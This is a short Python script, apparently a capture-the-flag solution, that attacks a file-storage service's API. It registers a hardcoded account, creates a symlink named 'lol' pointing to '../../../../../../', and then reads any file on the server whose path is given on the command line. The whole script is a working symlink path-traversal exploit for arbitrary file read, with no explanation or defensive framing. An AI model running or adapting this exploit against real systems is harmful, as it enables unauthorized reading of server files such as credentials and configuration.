from client import *
import string
import random
import sys

def random_string(stringLength=10):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

if not api_login('dookerman', 'dookerman'):
    api_register('dookerman', 'dookerman')
    api_create_file('flag.txt', 'hacks')
    api_create_symlink('lol', '../../../../../../')


def get_file(filename):
    return api_get_file('lol/{}'.format(filename))

print get_file(sys.argv[1])
